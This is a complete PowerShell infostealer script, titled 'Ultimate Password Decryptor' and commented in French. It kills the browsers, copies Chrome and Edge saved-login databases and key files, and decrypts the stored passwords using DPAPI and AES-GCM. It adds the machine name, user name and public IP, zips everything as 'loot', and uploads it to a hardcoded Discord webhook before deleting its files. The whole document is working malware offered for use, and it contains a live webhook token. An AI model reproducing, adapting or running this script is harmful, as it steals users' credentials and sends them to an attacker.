# Ultimate Password Decryptor - WORKING VERSION
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Kill browsers
taskkill /F /IM chrome.exe,msedge.exe,firefox.exe 2>$null
Start-Sleep -Seconds 1

# Setup
cd $env:TEMP
Remove-Item Loot -Recurse -Force -EA 0
mkdir Loot -Force | Out-Null

# Copier les fichiers
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"

Copy-Item "$chromePath\Login Data" "Loot\Chrome_Passwords.db" -EA 0
Copy-Item "$chromePath\Local State" "Loot\Chrome_Local_State" -EA 0
Copy-Item "$edgePath\Login Data" "Loot\Edge_Passwords.db" -EA 0
Copy-Item "$edgePath\Local State" "Loot\Edge_Local_State" -EA 0

# Fonction pour obtenir la clé de chiffrement AES
function Get-EncryptionKey {
    param([string]$localStatePath)
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        $encryptedKeyBytes = [Convert]::FromBase64String($encryptedKey)
        
        # Enlever le préfixe "DPAPI"
        $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
        
        # Déchiffrer avec DPAPI
        Add-Type -AssemblyName System.Security
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKeyBytes,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $key
    } catch {
        return $null
    }
}

# Fonction de déchiffrement AES-GCM
function Decrypt-AES-GCM {
    param(
        [byte[]]$encryptedData,
        [byte[]]$key
    )
    
    try {
        # Vérifier si c'est du AES-GCM (commence par "v10" ou "v11")
        if ($encryptedData[0] -eq 118 -and $encryptedData[1] -eq 49 -and $encryptedData[2] -eq 48) {
            # v10 = AES-GCM
            $nonce = $encryptedData[3..14]  # 12 bytes
            $ciphertext = $encryptedData[15..($encryptedData.Length - 17)]
            $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
            
            # Déchiffrement AES-GCM
            $aes = [System.Security.Cryptography.AesGcm]::new($key)
            $plaintext = New-Object byte[] $ciphertext.Length
            $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
            
            return [System.Text.Encoding]::UTF8.GetString($plaintext)
        } else {
            # Ancien format DPAPI
            Add-Type -AssemblyName System.Security
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encryptedData,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
    } catch {
        return $null
    }
}

# Fonction de déchiffrement SQLite
function Decrypt-Passwords {
    param(
        [string]$dbPath,
        [string]$localStatePath,
        [string]$browser
    )
    
    $results = @()
    $results += "===== $browser PASSWORDS =====`n`n"
    
    # Obtenir la clé de chiffrement
    $key = Get-EncryptionKey $localStatePath
    
    if ($null -eq $key) {
        $results += "ERROR: Could not get encryption key`n"
        return $results
    }
    
    # Télécharger SQLite si nécessaire
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (!(Test-Path $sqliteDll)) {
        try {
            $url = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"
            $zip = "$env:TEMP\sqlite.zip"
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing
            Expand-Archive $zip -DestinationPath $env:TEMP -Force
            Remove-Item $zip
        } catch {
            $results += "ERROR: Could not download SQLite: $($_.Exception.Message)`n"
            return $results
        }
    }
    
    try {
        Add-Type -Path $sqliteDll
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        
        $count = 0
        while ($reader.Read()) {
            try {
                $url = $reader["origin_url"]
                $user = $reader["username_value"]
                $encPwd = [byte[]]$reader["password_value"]
                
                if ($encPwd.Length -gt 0) {
                    $password = Decrypt-AES-GCM $encPwd $key
                    
                    if ($null -ne $password -and $password.Length -gt 0) {
                        $results += "URL: $url`n"
                        $results += "Username: $user`n"
                        $results += "Password: $password`n"
                        $results += "---`n`n"
                        $count++
                    }
                }
            } catch {
                # Skip failed decryptions
            }
        }
        
        $conn.Close()
        $results += "`nTotal: $count passwords decrypted`n`n"
    } catch {
        $results += "ERROR: $($_.Exception.Message)`n"
    }
    
    return $results
}

# Déchiffrer Chrome
if (Test-Path "Loot\Chrome_Passwords.db") {
    $chromeResults = Decrypt-Passwords "Loot\Chrome_Passwords.db" "Loot\Chrome_Local_State" "CHROME"
    $chromeResults | Out-File "Loot\CHROME_PASSWORDS.txt"
}

# Déchiffrer Edge
if (Test-Path "Loot\Edge_Passwords.db") {
    $edgeResults = Decrypt-Passwords "Loot\Edge_Passwords.db" "Loot\Edge_Local_State" "EDGE"
    $edgeResults | Out-File "Loot\EDGE_PASSWORDS.txt"
}

# System info
@"
COMPUTER: $env:COMPUTERNAME
USER: $env:USERNAME
DATE: $(Get-Date)
IP: $(try{(irm ifconfig.me -TimeoutSec 3)}catch{"N/A"})
"@ | Out-File "Loot\SYSTEM_INFO.txt"

# Compresser
Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force

# Upload
curl.exe -F "file=@loot.zip" -F "content=**New loot from $env:COMPUTERNAME**" $wh

# Cleanup
Start-Sleep -Seconds 3
Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
